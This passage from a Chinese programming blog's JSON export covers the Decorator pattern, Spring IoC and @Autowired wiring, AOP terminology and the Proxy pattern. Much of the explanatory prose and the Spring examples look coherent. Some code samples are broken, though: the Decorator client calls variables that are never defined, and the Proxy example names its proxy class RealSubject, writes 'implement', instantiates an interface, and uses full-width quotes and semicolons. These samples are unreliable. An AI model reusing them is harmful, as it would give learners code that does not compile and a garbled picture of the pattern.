客户端调用以及结果12345678910111213141516171819/** * 调用客户端 */public class Client &#123; public static void main(String[] args) &#123; System.out.println(\"=========我是土豪都给我加上===========\"); IPancake p1 = new Pancake(); IPancake p2 = new EggDecorator(p1); IPancake p3 = new HamDecorator(p222); IPancake p4 = new LettuceDecorator(p3); panckeWithEggAndHamAndLettuce.cook(); System.out.println(\"==========我是程序猿，加两个鸡蛋补补==============\"); IPancake p11 = new Pancake(); IPancake p12 = new EggDecorator(p11); IPancake p13 = new EggDecorator(p12); pancakeWithTwoEgg.cook(); &#125;&#125; 输出结果12345678910=========我是土豪都给我加上===========加了一颗生菜，加了一根火腿，加了一个鸡蛋，的煎饼==========我是程序猿，加两个鸡蛋补补==============加了一个鸡蛋，加了一个鸡蛋，的煎饼复制代码 总结关于装饰器模式的使用，在我看来主要有一下几点需要注意： 抽象装饰器和具体被装饰的对象实现同一个接口； 抽象装饰器里面要持有接口对象，以便请求传递； 具体装饰器覆盖抽象装饰器方法并用super进行调用，传递请求。 适用环境在以下情况下，可以使用装饰器模式： 在不影响其他对象的情况下，以动态、透明的方式给单个对象添加职责。 需要动态地给一个对象增加功能，这些功能也可以动态地被撤销。 当不能采用继承的方式对系统进行扩充或者采用继承不利于系统扩展和维护时。不能采用继承的情况主要有两类：第一类是系统中存在大量独立的扩展，为支持每一种组合将产生大量的子类，使得子类数目呈爆炸性增长；第二类是因为类定义不能继承（如final类）。 装饰器模式优缺点装饰模式的优点 装饰模式与继承关系的目的都是要扩展对象的功能，但是装饰模式可以提供比继承更多的灵活性。 可以通过一种动态的方式来扩展一个对象的功能，通过配置文件可以在运行时选择不同的装饰器，从而实现不同的行为。 通过使用不同的具体装饰类以及这些装饰类的排列组合，可以创造出很多不同行为的组合。可以使用多个具体装饰类来装饰同一对象，得到功能更为强大的对象。 具体构件类与具体装饰类可以独立变化，用户可以根据需要增加新的具体构件类和具体装饰类，在使用时再对其进行组合，原有代码无须改变，符合“开闭原则” 装饰模式的缺点 使用装饰模式进行系统设计时将产生很多小对象，这些对象的区别在于它们之间相互连接的方式有所不同，而不是它们的类或者属性值有所不同，同时还将产生很多具体装饰类。这些装饰类和小对象的产生将增加系统的复杂度，加大学习与理解的难度。 这种比继承更加灵活机动的特性，也同时意味着装饰模式比继承更加易于出错，排错也很困难，对于多次装饰的对象，调试时寻找错误可能需要逐级排查，较为烦琐。 进一步讨论装饰器模式与继承关系装饰器模式与继承关系的目的都是要扩展对象的功能，但是装饰器模式可以提供比继承更多的灵活性。装饰器模式允许系统动态决定“贴上”一个需要的“装饰”，或者除掉一个不需要的“装饰”。继承关系则不同，继承关系是静态的，它在系统运行前就决定了。 通过使用不同的具体装饰类以及这些装饰类的排列组合，设计师可以创造出很多不同行为的组合。 代理模式与装饰器模式模式的简化大多数情况下，装饰模式的实现都比在上面定义中给出的示意实现要简单。对模式进行简化时，需要注意以下的情况： 1 一个装饰器类的接口必须与被装饰的类的接口相容。 ConcreteDecorator类和ConcreteComponent必须继承自一个共同的父类，这个在装饰模式结构图中就有说明，但是在实际使用时，如果在模式的实现上有所简化，就必须特别注意这一点。 2 尽量保持Component作为一个“轻”类。 抽象构件的职责是接口而不是存储数据吗，注意不要把太多的逻辑和状态放在Component类里。Component可以是接口、抽象类或者具体类。 3 如果只有一个ComcreteComponent类而没有抽象的Component类（接口），那么Decorator类经常可以是ConcreteComponent的一个子类，如下图： 由上图可知，没有抽象的接口Component也是可以的，但ConcreteComponent就要扮演双重的角色。 4 如果只有一个ConcreteDecorator类，那么就没有必要建立一个单独的Decorator类，而可以把Decorator和ConcreteDecorator的责任合并成一个类。 甚至只有两个ConcreteDecorator类的情况下，也可以这样做；但是具体装饰类大于三个的话，使用一个单独的抽象装饰类就有必要了，如下图： 由上图可知，没有抽象的Decorator也是可以的，只是ConcreteDecorator需要扮演双重的角色。 半透明的装饰器模式装饰器模式和适配器模式都是“包装模式（Wrapper Pattern）”，它们都是通过封装其他对象达到设计的目的的，但是它们的形态有很大区别。 理想的装饰器模式在对被装饰对象进行功能增强的同时，要求具体组件角色、装饰器角色的接口与抽象组件角色的接口完全一致。而适配器模式则不然，一般而言，适配器模式并不要求对源对象（或者说被适配类）的功能进行增强，但是会改变源对象的接口，以便和目标接口相符合。 装饰器模式有透明和半透明两种，这两种的区别就在于装饰器角色的接口与抽象组件角色的接口是否完全一致。 透明的装饰器模式也就是理想的装饰器模式，要求具体组件角色、装饰器角色的接口与抽象组件角色的接口完全一致。 相反，如果装饰器角色的接口与抽象组件角色接口不一致，也就是说装饰器角色的接口比抽象组件角色的接口宽的话，装饰器角色实际上已经成了一个适配器角色，这种装饰器模式也是可以接受的，称为“半透明”的装饰器模式，如下图所示。 装饰器模式的应用装饰器模式在Java语言中的最著名的应用莫过于Java I/O标准库的设计了。 由于Java I/O库需要很多性能的各种组合，如果这些性能都是用继承的方法实现的，那么每一种组合都需要一个类，这样就会造成大量性能重复的类出现。而如果采用装饰器模式，那么类的数目就会大大减少，性能的重复也可以减至最少。因此装饰器模式是Java I/O库的基本模式。 Java I/O库的对象结构图如下，由于Java I/O的对象众多，因此只画出InputStream的部分。 根据上图可以看出： 抽象组件（Component）角色：由InputStream扮演。这是一个抽象类，为各种子类型提供统一的接口。 具体组件（ConcreteComponent）角色：由ByteArrayInputStream、FileInputStream、PipedInputStream、StringBufferInputStream等类扮演。它们实现了抽象组件角色所规定的接口。 抽象装饰器（Decorator）角色：由FilterInputStream扮演。它实现了InputStream所规定的接口。 具体装饰器（ConcreteDecorator）角色：由几个类扮演，分别是BufferedInputStream、DataInputStream以及两个不常用到的类LineNumberInputStream、PushbackInputStream。 Reference 《Java与模式》 设计模式——装饰器模式 - https://juejin.im/post/5add8e9cf265da0b9d77d377 《JAVA与模式》之装饰器模式 - https://www.cnblogs.com/java-my-life/archive/2012/04/20/2455726.html","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Spring】Spring中的IoC","date":"2019-04-08T04:13:15.000Z","path":"2019/04/08/【Spring】Spring中的IoC/","text":"什么是Spring?Spring 是个Java企业级应用的开源开发框架。Spring主要用来开发Java应用，但是有些扩展是针对构建J2EE平台的web应用。Spring框架目标是简化Java企业级应用开发，并通过POJO为基础的编程模型促进良好的编程习惯。 使用Spring框架的好处是什么？ 轻量：Spring 是轻量的，基本的版本大约2MB。 控制反转：Spring通过控制反转实现了松散耦合，对象们给出它们的依赖，而不是创建或查找依赖的对象们。 面向切面的编程（AOP）：Spring支持面向切面的编程，并且把应用业务逻辑和系统服务分开。 容器：Spring 包含并管理应用中对象的生命周期和配置。 MVC框架：Spring的WEB框架是个精心设计的框架，是Web框架的一个很好的替代品。 事务管理：Spring 提供一个持续的事务管理接口，可以扩展到上至本地事务下至全局事务（JTA）。 异常处理：Spring 提供方便的API把具体技术相关的异常（比如由JDBC，Hibernate or JDO抛出的）转化为一致的unchecked 异常。 控制反转（Inversion of Control, IoC）Spring的核心思想之一：（Inversion of Control， IoC）。 那么控制反转是什么意思呢？ 对象的实例化创建控制交给外部容器（或者说，控制反转容器，IoC Container）完成，这个就做控制反转。Spring使用控制反转来实现对象的实例化不用在程序中写死。 那么对象的对象之间的依赖关系Spring是怎么做的呢？？依赖注入（dependency injection）。 Spring使用依赖注入来实现对象之间的依赖关系 在创建完对象之后，对象的关系处理就是依赖注入 上面已经说了，控制反转是通过外部容器完成的，而Spring又为我们提供了这么一个容器，我们一般将这个容器叫做：控制反转容器（IoC容器）。 无论是创建对象、处理对象之间的依赖关系、对象创建的时间还是对象的数量，我们都是在Spring为我们提供的IoC容器上配置对象的信息就好了。 IoC容器的原理从上面就已经说了：IoC容器其实就是一个大工厂，它用来管理我们所有的对象以及依赖关系。 原理就是通过Java的反射技术来实现的！通过反射我们可以获取类的所有信息（成员变量、类名等等）； 再通过配置文件（XML）或者注解来描述类与类之间的关系； 我们就可以通过这些配置信息和反射技术来构建出对应的对象和依赖关系了。 上面描述的技术只要学过点Java的都能说出来，这一下子可能就会被面试官问倒了，我们简单来看看实际Spring IoC容器是怎么实现对象的创建和依赖的： 根据Bean配置信息在容器内部创建Bean定义注册表； 根据注册表加载、实例化bean、建立Bean与Bean之间的依赖关系； 将这些准备就绪的Bean放到Map缓存池中，等待应用程序调用。 IoC容器装配Bean装配Bean方式Spring4.x开始IoC容器装配Bean有4种方式： XML配置 注解 JavaConfig 基于Groovy DSL配置(这种很少见) 总的来说：我们以XML配置+注解来装配Bean得多，其中注解这种方式占大部分！ 依赖注入方式依赖注入的方式有3种方式： 属性注入，或者是说，通过setter()方法注入 构造函数注入 工厂方法注入 总的来说使用属性注入是比较灵活和方便的，这是大多数人的选择！ 通过XML装配BeanIBookDao.java12345678910/** * 图书数据访问接口 */public interface IBookDao &#123; /** * 新增图书 */ String addBook(String bookName);&#125; BookDao.java12345678910/** * 图书数据访问实现类 */public class BookDao implements IBookDao &#123; @Override public String addBook(String bookName) &#123; return \"新增图书 《\" + bookName + \"》 成功！\"; &#125;&#125; BookService12345678910111213141516171819202122import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;/** * 图书业务类 */public class BookService &#123; IBookDao iBookDao; public BookService() &#123; // IoC容器 ApplicationContext context = new ClassPathXmlApplicationContext(\"beans01.xml\"); // 从容器中获取id 为 bookdao 的bean iBookDao = context.getBean(\"bookdao\", IBookDao.class); &#125; public void storeBook(String bookName)&#123; System.out.println(\"图书上货\"); System.out.println(iBookDao.addBook(bookName)); &#125;&#125; beans01.xml1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"bookdao\" class=\"com.ray.IoC01.BookDao\"&gt;&lt;/bean&gt;&lt;/beans&gt; 测试类12345678public class Test &#123; @org.junit.Test public void testStoreBook()&#123; BookService bookService = new BookService(); bookService.storeBook(\"spring5.0.2中文官网文档\"); &#125;&#125; 通过注解来装配Bean上一个示例是使用传统的XML来实现IoC的配置定义（描述Bean 与 Bean 之间的关系）。 如果内容比较多则配置需花费很多时间，通过注解可以减轻工作量，但注解后修改要麻烦一些，偶合度会增加，应该根据需要选择合适的方法。 使用 @Autowired 自动装配 Bean@Autowired 注解自动装配具有兼容类型的单个 Bean 属性： 构造器, 普通字段（即使是非 public）， 一切具有参数的方法都可以应用@Authwired 注解； 默认情况下， 所有使用 @Authwired 注解的属性都需要被设置. 当 Spring 找不到匹配的 Bean 装配属性时， 会抛出异常， 若某一属性允许不被设置， 可以设置 @Authwired 注解的 required 属性为 false； 默认情况下， 当 IoC 容器里存在多个类型兼容的 Bean 时， 通过类型的自动装配将无法工作. 此时可以在 @Qualifier 注解里提供 Bean 的名称. Spring 允许对方法的入参标注 @Qualifiter 已指定注入 Bean 的名称； @Authwired 注解也可以应用在数组类型的属性上， 此时 Spring 将会把所有匹配的 Bean 进行自动装配. @Authwired 注解也可以应用在集合属性上， 此时 Spring 读取该集合的类型信息， 然后自动装配所有与之兼容的 Bean. @Authwired注解用在 java.util.Map 上时， 若该 Map 的键值为 String， 那么 Spring 将自动装配与之 Map 值类型兼容的 Bean， 此时 Bean 的名称作为键值 例子1 使用 @Autowired 注解配置 Bean 代码示例在 UserService 类中， 使用 Autowire 注解来装配一个 UserRepository 1234567891011@Servicepublic class UserService &#123; @Autowired private UserRepository userRepository; public void add()&#123; System.out.println(\"UserService add...\"); userRepository.save(); &#125;&#125; 然后在 UserController 中， 使用 Autowire 注解来装配一个 UserService 1234567891011@Controllerpublic class UserController &#123; @Autowired private UserService userService; public void execute()&#123; System.out.println(\"UserController execute...\"); userService.add(); &#125;&#125; 然后通过 ApplicationContext 去获取 UserController 的 bean 实例 123456789public class AnnotationDemo &#123; public static void main(String[] args) &#123; ApplicationContext actx = new ClassPathXmlApplicationContext(\"config/annotation-beans.xml\"); UserController userController = (UserController) actx.getBean(\"userController\"); System.out.println(userController); userController.execute(); &#125;&#125; 得到结果如下： 1234org.lovian.spring.bean.annotation.controller.UserController@101df177UserController execute...UserService add...User Repository saved. 我们可以看到通过调用 UserController 的 execute 方法，每一层的方法依次都被调用了，说明通过 Autowire 注解配置的 bean 都被 IoC 容器所管理并且自动装配了。 2 通过构造器方式和@Autowired来装配 bean但是，直接把 @Autowired 注解配置到字段属性上已经不是 Spring team 所推荐的： 1Spring Team Recommands ：Always use constructor based dependency injection in your beans. Always use assertions for mandatory dependencies&quot;. 所以我们将上面的装配方式做一下修改，通过构造器的方式来配置，代码如下： UserService类 123456789101112131415@Servicepublic class UserService &#123; private UserRepository userRepository; @Autowired public UserService(UserRepository userRepository) &#123; this.userRepository = userRepository; &#125; public void add()&#123; System.out.println(\"UserService add...\"); userRepository.save(); &#125;&#125; UserController类 123456789101112131415@Controllerpublic class UserController &#123; private UserService userService; @Autowired public UserController(UserService userService) &#123; this.userService = userService; &#125; public void execute()&#123; System.out.println(\"UserController execute...\"); userService.add(); &#125;&#125; 然后我们再执行一遍 main 函数就可以发现， 得到的结果和之前直接在字段上使用 @Autowired 的结果是一样的。 3 如果自动装配的 Bean 不存在有一种情况，当使用了 @Autowired 注解来配置 bean， 但是这个 bean 实际上并不存在于 IoC 容器中， 那么这是就需要在 @Autowired 上 使用 required = fasle属性。 修改 UserRepositoryImpl 类： 1234567891011@Repository(value = &quot;userRepository&quot;)public class UserRepositoryImpl implements UserRepository &#123; @Autowired(required = false) private TestObject testObject; public void save() &#123; System.out.println(&quot;User Repository saved.&quot;); System.out.println(testObject); &#125;&#125; 这样 IoC 容器会把容器中的 bean 装配给 userRepository，然后我们修改配置文件，将 testObject 类从 IoC 容器中过滤掉： 123&lt;context:component-scan base-package=&quot;org.lovian.spring.bean.annotation&quot;&gt; &lt;context:exclude-filter type=&quot;regex&quot; expression=&quot;org.lovian.spring.bean.annotation.TestObject&quot;/&gt;&lt;/context:component-scan&gt; 然后执行 main 方法，得到结果如下： 12345org.lovian.spring.bean.annotation.controller.UserController@12028586UserController execute...UserService add...User Repository saved.null 可以看到，testObject bean 打印结果为 null， 也就是说， 即使 IoC 容器中没有这个 Bean， 也并不影响程序的运行，bean 就被初始化成 null。 4 如果有两个相同接口的实现类我们从上面的例子可以看出来， Sping IoC 容器会自动扫描指定包中的class,但是如果一个接口，有两个实现类，比如说，UserRepository 接口有两个实现类 UserRepositoryImpl 和 UserJdbcRepository， 那么在 UserService 中，@Autowired 是怎么装配的。 通过 @Autowired 修饰的字段名字或者构造函数的参数名指定 bean 通过 @Qualifier 指定 bean 我们先增加一个 UserJdbcRepository的实现类 123456789import org.springframework.stereotype.Repository;@Repositorypublic class UserJdbcRepository implements UserRepository&#123; public void save() &#123; System.out.println(\"UserJdbcRepository saved....\"); &#125;&#125; 那么在 UserService 中，我们要装配 UserRepository： 123456789101112131415@Servicepublic class UserService &#123; private UserRepository userRepository; @Autowired public UserService(UserRepository userJdbcRepository) &#123; this.userRepository = userJdbcRepository; &#125; public void add()&#123; System.out.println(\"UserService add...\"); userRepository.save(); &#125;&#125; 注意这里的构造器的参数名是 userJdbcRepository， 而不是 userRepository，那么打印结果是： 1234org.lovian.spring.bean.annotation.controller.UserController@11c20519UserController execute...UserService add...UserJdbcRepository saved.... 可以发现这里 IoC 容器给 UserService 装配的 UserRepository 的实例是 UserJdbcRepository 的 bean。如果这里参数名用 userRepository 的话，那么 IoC 容器将给其装配名字叫 userRepository 的 Bean。 同理，如果是用 @Autowired 来修饰字段的话，那么字段的名字和 bean 的名称做匹配 1234567891011@Servicepublic class UserService &#123; @Autowired private UserRepository userJdbcRepository; public void add()&#123; System.out.println(\"UserService add...\"); userJdbcRepository.save(); &#125;&#125; 这样，IoC 容器给 UserService 装配的也是 UserJdbcRepository 的实例。 还可以通过 @Qualifier来指定要装配的 bean 的名称： 123456789101112@Servicepublic class UserService &#123; @Autowired @Qualifier(\"userJdbcRepository\") private UserRepository userRepository; public void add()&#123; System.out.println(\"UserService add...\"); userRepository.save(); &#125;&#125; 以及用@Qualifier修饰构造函数中的参数： 123456789101112131415@Servicepublic class UserService &#123; private UserRepository userRepository; @Autowired public UserService(@Qualifier(\"userJdbcRepository\") UserRepository userRepository) &#123; this.userRepository = userRepository; &#125; public void add()&#123; System.out.println(\"UserService add...\"); userRepository.save(); &#125;&#125; 这样装配的结果都是把 UserJdbcRepository 装配给 UserService 小结使用零配置和注解虽然方便，不需要编写麻烦的XML文件，但并非为了取代XML，应该根据实例需要选择，或二者结合使用，毕竟使用一个类作为容器的配置信息是硬编码的，不好在发布后修改。 除了@Component外，Spring提供了3个功能基本和@Component等效的注解，分别对应于用于对DAO，Service，和Controller进行注解。 注解说明 注解 说明 @Service 用于注解业务层组件（通常定义的service层就用这个） @Controller 用于注解控制层组件 @Repository 用于注解数据访问层组件（即Dao组件） @Component 泛指组件，当不好归类时，可以使用该注解 Reference Spring IoC知识点一网打尽！- &lt;https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247484247&amp;idx=1&amp;sn=e228e29e344559e469ac3ecfa9715217&amp;chksm=ebd74256dca0cb40059f3f627fc9450f916c1e1b39ba741842d91774f5bb7f518063e5acf5a0#rd Spring入门这一篇就够了 - https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247483942&amp;idx=1&amp;sn=f71e1adeeaea3430dd989ef47cf9a0b3&amp;chksm=ebd74327dca0ca3141c8636e95d41629843d2623d82be799cf72701fb02a665763140b480aec&amp;scene=21#wechat_redirect Spring 的本质系列(1) – 依赖注入 - https://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665513179&amp;idx=1&amp;sn=772226a5be436a0d08197c335ddb52b8&amp;scene=21#wechat_redirect Spring IoC 实战（三）- https://qq343509740.gitee.io/2018/08/20/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring/Spring%20IoC%20%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%89%EF%BC%89/#%E6%B5%8B%E8%AF%95%E7%B1%BB [JAVA_Spring] Spring 中通过注解装配 Bean 与 Bean 之间的关系 - https://blog.lovian.org/spring/2018/04/22/java-annotation-bean.html","comments":true,"categories":[{"name":"Spring","slug":"Spring","permalink":"http://swsmile.info/categories/Spring/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"http://swsmile.info/tags/Spring/"}]},{"title":"【Spring】面向切面编程（AOP） 与Spring","date":"2019-04-08T04:01:00.000Z","path":"2019/04/08/【Spring】AOP与Spring/","text":"AOP（Aspect Oriented Programming），即面向切面编程背景AOP（Aspect Oriented Programming），即面向切面编程，可以说是OOP（Object Oriented Programming，面向对象编程）的补充和完善。 OOP引入封装、继承、多态等概念来建立一种对象层次结构，用于模拟公共行为的一个集合。 不过，OOP只允许开发者定义纵向的关系，而不能定义横向的关系，例如日志功能。因此，负责日志处理的代码不得不横向且重复地与业务逻辑（business logic）代码混合在一起。 而这些负责日志处理的代码，与附近的业务逻辑（business logic）代码毫无关系。这种散布在各处的与业务逻辑无关的代码被称为横切（cross cutting）。 因此，在OOP设计中，它导致了大量代码的重复，而不利于各个模块的重用。 AOP（Aspect Oriented Programming）AOP技术恰恰相反，它利用一种称为”横切”的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为“Aspect”，即切面。所谓“切面”，简单说就是那些与业务无关，却为业务模块所共同调用的逻辑或责任封装起来，便于减少系统的重复代码，降低模块之间的耦合度，并有利于未来的可操作性和可维护性。 使用“横切”技术，AOP把软件系统分为两个部分：核心关注点和横切关注点。 核心关注点，比如登陆，增加数据，删除数据都叫核心业务横切关注点，比如性能统计，日志，事务管理等等 业务处理的主要流程是核心关注点，与之关系不大的部分是横切关注点。横切关注点的一个特点是，他们经常发生在核心关注点的多处，而各处基本相似，比如权限认证、日志、事物。AOP的作用在于分离系统中的各种关注点，将核心关注点和横切关注点分离开来。 AOP 目的AOP能够将那些本身与业务无关，却为业务模块所共同调用的逻辑或责任（例如事务处理、日志管理、权限控制等）封装起来，便于减少系统的重复代码，降低模块间的耦合度，并有利于未来的可拓展性和可维护性。 AOP 术语在我们开始使用 AOP 工作之前，让我们熟悉一下 AOP 概念和术语。这些术语并不特定于 Spring，而是与 AOP 有关的。 项 描述 Joinpoint（连接点） 被拦截到的点，因为Spring只支持方法类型的连接点，所以在Spring中连接点指的就是被拦截到的方法，实际上连接点还可以是字段或者构造器 Pointcut（切入点） 这是一组一个或多个连接点，通知应该被执行。你可以使用表达式或模式指定切入点正如我们将在 AOP 的例子中看到的 Advice（通知） 这是实际行动之前或之后执行的方法。这是在程序执行期间通过 Spring AOP 框架实际被调用的代码 Aspect（切面） 一个模块具有一组提供横切需求的 APIs。例如，一个日志模块为了记录日志将被 AOP 方面调用。应用程序可以拥有任意数量的方面，这取决于需求 Weaving（织入） Weaving 把方面连接到其它的应用程序类型或者对象上，并创建一个被通知的对象。这些可以在编译时，类加载时和运行时完成 Introduction（引入） 在不修改代码的前提下，引入可以在运行期为类动态地添加一些方法或字段 通知的类型Spring 方面可以使用下面提到的五种通知工作： 通知 描述 前置通知（Before advice） 在一个方法执行之前，执行通知。 最终通知（After (finally) advice） 在一个方法执行之后，不考虑其结果，执行的通知。 返回后通知（After returning advice） 在一个方法执行之后，只有在方法成功完成时，才能执行通知。 异常通知（After throwing advice） 在一个方法执行之后，只有在方法退出抛出异常时，才能执行通知。 环绕通知（Around Advice） 在建议方法调用之前和之后，执行通知。 Spring对AOP的支持Spring中AOP代理由Spring的IoC容器（Inversion of Control Container）负责生成、管理，其依赖关系也由IoC容器负责管理。因此，AOP代理可以直接使用容器中的其它bean实例作为目标，这种关系可由IoC容器的依赖注入提供。 Spring创建代理的规则为： 默认使用Java动态代理来创建AOP代理，这样就可以为任何接口实例创建代理了； 当需要代理的类不是代理接口的时候，Spring会切换为使用CGLIB代理，也可强制使用CGLIB； AOP编程其实是很简单的事情，纵观AOP编程，程序员只需要参与三个部分： 定义普通业务组件； 定义切入点，一个切入点可能横切多个业务组件； 定义增强处理，增强处理就是在AOP框架为普通业务组件织入的处理动作。 所以进行AOP编程的关键就是定义切入点和定义增强处理，一旦定义了合适的切入点和增强处理，AOP框架将自动生成AOP代理，即：代理对象的方法=增强处理+被代理对象的方法。 主要功能 日志记录 性能统计 安全控制 事物处理 异常处理 Reference Wikipedia Aspect-oriented programming - https://en.wikipedia.org/wiki/Aspect-oriented_programming Spring AOP 详解（五） - https://qq343509740.gitee.io/2018/08/21/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring/Spring%20AOP%20%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%94%EF%BC%89/#AOP-%E7%AE%80%E4%BB%8B Spring AOP详解 - https://cloud.tencent.com/developer/news/196894 Spring-aop 全面解析（从应用到原理） - https://juejin.im/post/591d8c8ba22b9d00585007dd Chapter 6. 使用Spring进行面向切面编程（AOP） - http://shouce.jb51.net/spring/aop.html","comments":true,"categories":[{"name":"Spring","slug":"Spring","permalink":"http://swsmile.info/categories/Spring/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"http://swsmile.info/tags/Spring/"}]},{"title":"【Design Pattern】结构类模式 —- 代理模式（Proxy Pattern）","date":"2019-04-05T13:50:14.000Z","path":"2019/04/05/【Design-Pattern】结构类模式-代理模式-Proxy-Pattern/","text":"代理模式（Proxy Pattern）代理模式使用代理对象完成用户请求，屏蔽用户对真实对象的访问。 现实世界的代理人被授权执行当事人的一些事宜，无需当事人出面，从第三方的角度看，似乎当事人并不存在，因为他只和代理人通信。而事实上代理人是要有当事人的授权，并且在核心问题上还需要请示当事人。 在需要科学上网时，我们通常会搭建一个代理服务器，并且通过这个代理服务器来访问Google或Youtube。至于具体是哪个Google的服务器来服务我们，我们是不知情，同时也不需要了解的。只有代理服务器才需要关注这个事情。 在软件设计中，使用代理模式的意图也很多，比如因为安全原因需要屏蔽客户端直接访问真实对象，或者在远程调用中需要使用代理类处理远程方法调用的技术细节 (如 RMI)，也可能为了提升系统性能，对真实对象进行封装，从而达到延迟加载的目的。 代理模式的角色 主题接口（Subject）：一个借口，定义了代理类（Proxy）和真实主题（RealSubject）的公共对外方法； 真实主题（RealSubject）：真正实现业务逻辑的类； 代理类（Proxy）：用来代理和封装真实主题； 客户端：调用代理类和主题接口来完成一些工作。 例子小成希望买一台最新的顶配Mac电脑。但是，由于在国内还没上市，只有美国才有。因此，小成将通过代购进行购买。 主体接口（Subject）123public interface Subject &#123; public void buyMac();&#125; 真实对象类（RealSubject）123456public class RealSubject implement Subject&#123; @Override public void buyMac() &#123; System.out.println(”买一台Mac“); &#125; &#125; 代理类（Proxy）1234567891011public class RealSubject implement Subject&#123; private Subject subject; public RealSubject(Subject subject)&#123; this.subject = subject; &#125; @Override public void buyMac() &#123; this.subject.buyMac(); System.out.println(”通过指定的代购，买了一台Mac“); &#125; &#125; 客户端调用1234567public class ProxyPattern &#123; public static void main(String[] args)&#123; Subject proxy = new Proxy(new Subject())； proxy.buyMac()； &#125;&#125; 代理模式的应用场景根据代理模式的使用目的，常见的代理模式有以下几种类型： 远程代理（Remote Proxy）：为一个位于不同的地址空间的对象提供一个本地的代理对象，这个不同的地址空间可以是在同一台主机中，也可是在另一台主机中，远程代理又叫做大使（Ambassador）。 虚拟代理（Virtual Proxy）：如果需要创建一个资源消耗较大的对象，先创建一个消耗相对较小的对象来表示，真实对象只在需要时才会被真正创建。 Copy-on-Write代理：它是虚拟代理的一种，把复制（克隆）操作延迟到只有在客户端真正需要时才执行。一般来说，对象的深克隆（deep copy）是一个开销较大的操作，Copy-on-Write代理可以让这个操作延迟，只有对象被用到的时候才被克隆。 保护代理（Protect or Access Proxy）：控制对一个对象的访问，可以给不同的用户提供不同级别的使用权限。 缓冲代理（Cache Proxy）：为某一个目标操作的结果提供临时的存储空间，以便多个客户端可以共享这些结果。 防火墙代理（Firewall Proxy）：保护目标不让恶意用户接近。 同步化代理（Synchronization Proxy）：使几个用户能够同时使用一个对象而没有冲突。 智能引用代理（Smart Reference Proxy）：当一个对象被引用时，提供一些额外的操作，如将此对象被调用的次数记录下来等。 延迟加载以一个简单的示例来阐述使用代理模式实现延迟加载的方法及其意义。假设某客户端软件有根据用户请求去数据库查询数据的功能。在查询数据前，需要获得数据库连接，软件开启时初始化系统的所有类，此时尝试获得数据库连接。当系统有大量的类似操作存在时 (比如 XML 解析等)，所有这些初始化操作的叠加会使得系统的启动速度变得非常缓慢。为此，使用代理模式的代理类封装对数据库查询中的初始化操作，当系统启动时，初始化这个代理类，而非真实的数据库查询类，而代理类什么都没有做。因此，它的构造是相当迅速的。 在系统启动时，将消耗资源最多的方法都使用代理模式分离，可以加快系统的启动速度，减少用户的等待时间。而在用户真正做查询操作时再由代理类单独去加载真实的数据库查询类，完成用户的请求。这个过程就是使用代理模式实现了延迟加载。 延迟加载的核心思想是：如果当前并没有使用这个组件，则不需要真正地初始化它，使用一个代理对象替代它的原有的位置，只要在真正需要的时候才对它进行加载。使用代理模式的延迟加载是非常有意义的，首先，它可以在时间轴上分散系统压力，尤其在系统启动时，不必完成所有的初始化工作，从而加速启动时间；其次，对很多真实主题而言，在软件启动直到被关闭的整个过程中，可能根本不会被调用，初始化这些数据无疑是一种资源浪费。 动态代理动态代理是指在运行时动态生成代理类。即，代理类的字节码将在运行时生成并载入当前代理的 ClassLoader。与静态处理类相比，动态类有诸多好处。首先，不需要为真实主题写一个形式上完全一样的封装类，假如主题接口中的方法很多，为每一个接口写一个代理方法也很麻烦。如果接口有变动，则真实主题和代理类都要修改，不利于系统维护；其次，使用一些动态代理的生成方法甚至可以在运行时制定代理类的执行逻辑，从而大大提升系统的灵活性。 动态代理类使用字节码动态生成加载技术，在运行时生成加载类。生成动态代理类的方法很多，如，JDK 自带的动态处理、CGLIB、Javassist 或者 ASM 库。JDK 的动态代理使用简单，它内置在 JDK 中，因此不需要引入第三方 Jar 包，但相对功能比较弱。CGLIB 和 Javassist 都是高级的字节码生成库，总体性能比 JDK 自带的动态代理好，而且功能十分强大。ASM 是低级的字节码生成工具，使用 ASM 已经近乎于在使用 Java bytecode 编程，对开发人员要求最高，当然，也是性能最好的一种动态代理生成工具。但 ASM 的使用很繁琐，而且性能也没有数量级的提升，与 CGLIB 等高级字节码生成工具相比，ASM 程序的维护性较差，如果不是在对性能有苛刻要求的场合，还是推荐 CGLIB 或者 Javassist。 优缺点优点 代理模式能够协调调用者和被调用者，在一定程度上降低了系统的耦合度。 远程代理使得客户端可以访问在远程机器上的对象，远程机器可能具有更好的计算性能与处理速度，可以快速响应并处理客户端请求。 虚拟代理通过使用一个小对象来代表一个大对象，可以减少系统资源的消耗，对系统进行优化并提高运行速度。 保护代理可以控制对真实对象的使用权限。 缺点 由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢。 实现代理模式需要额外的工作，有些代理模式的实现非常复杂。 Reference 代理模式原理及实例讲解 - https://www.ibm.com/developerworks/cn/java/j-lo-proxy-pattern/index.html 代理模式 - https://design-patterns.readthedocs.io/zh_CN/latest/structural_patterns/proxy.html#id16 代理模式（Proxy Pattern）- 最易懂的设计模式解析 - https://blog.csdn.net/carson_ho/article/details/54910472","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design 